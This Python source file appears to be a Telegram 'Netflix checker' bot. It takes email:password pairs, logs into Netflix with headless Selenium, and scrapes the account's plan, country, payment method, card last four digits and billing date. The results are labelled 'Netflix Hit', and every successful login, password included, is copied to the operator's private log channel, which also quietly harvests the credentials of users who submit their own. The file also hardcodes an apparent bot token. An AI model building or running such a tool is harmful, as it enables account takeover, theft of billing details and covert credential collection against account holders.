import telebot
import time
import re
import threading
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager

# --- CONFIGURATION ---
BOT_TOKEN = '8275967309:AAHHd79I0MoJHf6ylaGH_KRksmQ1BNUQS9w'
LOG_CHANNEL_ID = -1001234567890  # Replace with your channel ID
ADMIN_ID = 7713951010           # Replace with your Telegram user ID

country_map = {
    "US": "United States 🇺🇸",
    "GB": "United Kingdom 🇬🇧",
    "CA": "Canada 🇨🇦",
    "AU": "Australia 🇦🇺",
    "DE": "Germany 🇩🇪",
    "FR": "France 🇫🇷",
    "ES": "Spain 🇪🇸",
    "IT": "Italy 🇮🇹",
    "IN": "India 🇮🇳",
    "BR": "Brazil 🇧🇷",
    "ZW": "Zimbabwe 🇿🇼"
}

bot = telebot.TeleBot(BOT_TOKEN)

def get_stable_selectors():
    return {
        "user": (By.NAME, "userLoginId"),
        "pass": (By.NAME, "password"),
        "submit": (By.XPATH, "//button[@data-testid='login-button']")
}

def check_netflix_account(email, password):
    options = webdriver.ChromeOptions()
    options.add_argument("--headless")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-gpu")
    options.add_argument("user-agent=Mozilla/5.0")

    service = Service(ChromeDriverManager().install())
    driver = None

    try:
        driver = webdriver.Chrome(service=service, options=options)
        driver.get("https://www.netflix.com/login")

        selectors = get_stable_selectors()
        WebDriverWait(driver, 10).until(EC.presence_of_element_located(selectors["user"])).send_keys(email)
        driver.find_element(*selectors["pass"]).send_keys(password)
        driver.find_element(*selectors["submit"]).click()
        time.sleep(5)

        source = driver.page_source

        if "Incorrect password" in source or "Sign In" in source:
            return "Failure", "❌ Invalid Credentials"
        if "Your membership has already been canceled." in source:
            return "Cancelled", "🚫 Account Cancelled"
        if "memberHome" not in source:
            return "Failure", "❓ Unknown Error"

        def parse_from_source(key, text):
            match = re.search(rf'"{key}":{{"fieldType":"(String|Numeric)","value":"?([^"]*)"?}}', text)
            if match:
                return match.group(2).replace(r"\x20", " ")
            match_bool = re.search(rf'"{key}":{{"fieldType":"Boolean","value":([^}}]*)}}', text)
            return match_bool.group(1) if match_bool else "N/A"

        def parse_payment(key, text):
            match = re.search(rf'"{key}":{{"fieldType":"String","value":"([^"]*)"}}.*?paymentOptionLogo', text, re.DOTALL)
            return match.group(1) if match else "N/A"

        country_code = parse_from_source("currentCountry", source)
        country = country_map.get(country_code, country_code)

        captured_data = {
            "Plan": parse_from_source("localizedPlanName", source),
            "Country": country,
            "Max Streams": parse_from_source("maxStreams", source),
            "Video Quality": parse_from_source("videoQuality", source),
            "Plan Price": parse_from_source("planPrice", source),
            "Payment Method": parse_from_source("paymentMethod", source),
            "Payment Type": re.search(r'"paymentOptionLogo":"([^"]*)"', source).group(1) if re.search(r'"paymentOptionLogo":"([^"]*)"', source) else "N/A",
            "Last 4": parse_payment("displayText", source),
            "Expiry": parse_from_source("nextBillingDate", source).replace(r"\x20", "/"),
            "Extra Member": parse_from_source("showExtraMemberSection", source)
}

        result_text = (
            f"✅ Netflix Hit ✅\n\n"
            f"📧 Email: `{email}`\n"
            f"🔑 Pass: `{password}`\n\n"
            f"--- Account Info ---\n"
            f"🌍 Country: {captured_data['Country']}\n"
            f"💎 Plan: {captured_data['Plan']}\n"
            f"🖥️ Quality: {captured_data['Video Quality']}\n"
            f"📺 Streams: {captured_data['Max Streams']}\n"
            f"💲 Price: {captured_data['Plan Price']}\n\n"
            f"--- Billing Info ---\n"
            f"💳 Method: {captured_data['Payment Method']} ({captured_data['Payment Type']})\n"
            f"🔢 Last 4: {captured_data['Last 4']}\n"
            f"🗓️ Expiry: {captured_data['Expiry']}\n"
            f"🧑‍🤝‍🧑 Extra Member: {captured_data['Extra Member']}\n\n"
            f"Config By @Lindanat1"
)
        return "Success", result_text

    except Exception as e:
        return "Error", f"An error occurred: {e}"
    finally:
        if driver:
            driver.quit()

def delete_message_after(chat_id, message_id, seconds):
    def task():
        time.sleep(seconds)
        try:
            bot.delete_message(chat_id, message_id)
        except:
            pass
    threading.Thread(target=task).start()

def log_to_channel(hit_message):
    try:
        bot.send_message(LOG_CHANNEL_ID, hit_message, parse_mode="Markdown", disable_web_page_preview=True)
    except Exception as e:
        bot.send_message(ADMIN_ID, f"Failed to log to channel: {e}")

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Welcome! Send me your Netflix credentials in `email:password` format to check.")

@bot.message_handler(func=lambda message: ':' in message.text and '@' in message.text)
def handle_check(message):
    if message.chat.type!= "private" and message.from_user.id!= ADMIN_ID:
        return

    try:
        email, password = message.text.split(':', 1)
        email = email.strip()
        password = password.strip()
    except ValueError:
        reply = bot.reply_to(message, "❌ Invalid format. Please use `email:password`.")
        delete_message_after(message.chat.id, message.message_id, 30)
        delete_message_after(reply.chat.id, reply.message_id, 30)
        return

    status_msg = bot.reply_to(message, "⏳ Checking your account, please wait...")

    def check_task():
        status, result_text = check_netflix_account(email, password)
        try:
            bot.edit_message_text(result_text, status_msg.chat.id, status_msg.message_id, parse_mode="Markdown", disable_web_page_preview=True)
        except:
            bot.edit_message_text(result_text, status_msg.chat.id, status_msg.message_id)
        if status == "Success":
            log_to_channel(result_text)
        delete_message_after(message.chat.id, message.message_id, 30)
        delete_message_after(status_msg.chat.id, status_msg.message_id, 30)

    threading.Thread(target=check_task).start()

@bot.message_handler(func=lambda message: True)
def fallback(message):
    if message.chat.type == "private":
        reply = bot.reply_to(message, "❌ Invalid format. Please use `email:password`.")
        delete_message_after(message.chat.id, message.message_id, 30)
        delete_message_after(reply.chat.id, reply.message_id, 30)

if __name__ == "__main__":
    print("Bot is running...")
    bot.polling(none_stop=True, interval=0)
